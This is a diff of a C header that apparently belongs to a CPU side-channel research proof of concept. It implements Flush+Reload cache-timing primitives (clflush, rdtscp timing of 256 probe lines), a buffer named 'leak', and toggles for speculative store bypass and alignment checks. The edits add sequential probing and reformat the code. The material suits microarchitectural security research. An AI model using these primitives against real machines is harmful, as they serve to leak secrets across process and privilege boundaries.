@@ -23,6 +23,8 @@
 #define PR_SPEC_DISABLE 4
 #endif
 
+#define SEQ_ACCESS
+
 /**
  * The flags argument
  *     MAP_ANONYMOUS
@@ -105,36 +107,36 @@
  * 
  */
 #define ALLOC_BUFFERS()\
-	__attribute__((aligned(4096))) size_t results[256] = {0};\
-	unsigned char *reloadbuffer = (unsigned char *)mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 0x80;\
-	unsigned char *leak = mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
-	unsigned char *privatebuf = mmap(NULL, 4096*128, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
-	(void)privatebuf;
+    __attribute__((aligned(4096))) size_t results[256] = {0};\
+    unsigned char *reloadbuffer = (unsigned char *)mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 0x80;\
+    unsigned char *leak = mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
+    unsigned char *privatebuf = mmap(NULL, 4096*128, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
+    (void)privatebuf;
 
 static inline void enable_SSBM() {
         prctl(PR_SET_SPECULATION_CTRL, 0, 8, 0, 0);
 }
 
 static inline __attribute__((always_inline)) void enable_alignment_checks() {
-	asm volatile(
-		"pushf\n"
-		"orl $(1<<18), (%rsp)\n"
-		"popf\n"
-	);
+    asm volatile(
+        "pushf\n"
+        "orl $(1<<18), (%rsp)\n"
+        "popf\n"
+    );
 }
 
 static inline __attribute__((always_inline)) void disable_alignment_checks() {
-	asm volatile(
-		"pushf\n"
-		"andl $~(1<<18), (%rsp)\n"
-		"popf\n"
-	);
+    asm volatile(
+        "pushf\n"
+        "andl $~(1<<18), (%rsp)\n"
+        "popf\n"
+    );
 }
 
 static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
-	uint64_t lo, hi;
-	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
-	return (hi << 32) | lo;
+    uint64_t lo, hi;
+    asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
+    return (hi << 32) | lo;
 }
 
 /**
@@ -144,34 +146,46 @@ static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
  * 
  */
 static inline __attribute__((always_inline)) void flush(unsigned char *reloadbuffer) {
-	for (size_t k = 0; k < 256; ++k) {
-		size_t x = ((k * 167) + 13) & (0xff);
-		volatile void *p = reloadbuffer + x * 1024;
-		asm volatile("clflush (%0)\n"::"r"(p));
-	}
+    for (size_t k = 0; k < 256; ++k) {
+        #ifdef SEQ_ACCESS
+            size_t x = k;
+        #else
+            size_t x = ((k * 167) + 13) & (0xff);
+        #endif
+
+        volatile void *p = reloadbuffer + x * 1024;
+        asm volatile("clflush (%0)\n"::"r"(p));
+    }
 }
 
-// REVIEW (ax + b) mod p. TIME_LIMIT
 /**
  * Update results based on timing of reloads.
  * 
  * @param reloadbuffer reloadbuffer to be flushed
  * @param results counts of timing of reloads exceeding TIME_LIMIT
  * 
+ * @todo This random function is awful.
+ *     0 3 6 9 12 15 18 21 mod 8
+ *     = 0 3 6 1 4 7 2 3 mod 8
+ * 
  */
 static inline __attribute__((always_inline)) void reload(unsigned char *reloadbuffer, size_t *results) {
-	asm volatile("mfence\n");
-	for (size_t k = 0; k < 256; ++k) {
-		size_t x = ((k * 167) + 13) & (0xff);
+    asm volatile("mfence\n");
+    for (size_t k = 0; k < 256; ++k) {
+        #ifdef SEQ_ACCESS
+            size_t x = k;
+        #else
+            size_t x = ((k * 167) + 13) & (0xff);
+        #endif
 
-		unsigned char *p = reloadbuffer + (1024 * x);
+        unsigned char *p = reloadbuffer + (1024 * x);
 
-		uint64_t t0 = rdtscp();
-		*(volatile unsigned char *)p;
-		uint64_t dt = rdtscp() - t0;
+        uint64_t t0 = rdtscp();
+        *(volatile unsigned char *)p;
+        uint64_t dt = rdtscp() - t0;
 
-		if (dt < 160) results[x]++;
-	}
+        if (dt < 160) results[x]++;
+    }
 }
 
 // REVIEW RECOVERY_RATE
@@ -182,9 +196,9 @@ static inline __attribute__((always_inline)) void reload(unsigned char *reloadbu
  * 
  */
 void print_results(size_t *results) {
-	for (size_t c = 1; c < 256; ++c) {
-		if (results[c] >= ITERS/100) {
-			printf("%08zu: %02x (%c)\n", results[c], (unsigned int)c, isprint(c) ? (unsigned int)c : '?');
-		}
-	}
+    for (size_t c = 0; c < 256; ++c) {
+        if (results[c] >= ITERS/100) {
+            printf("%08zu: %02x (%c)\n", results[c], (unsigned int)c, isprint(c) ? (unsigned int)c : '?');
+        }
+    }
 }
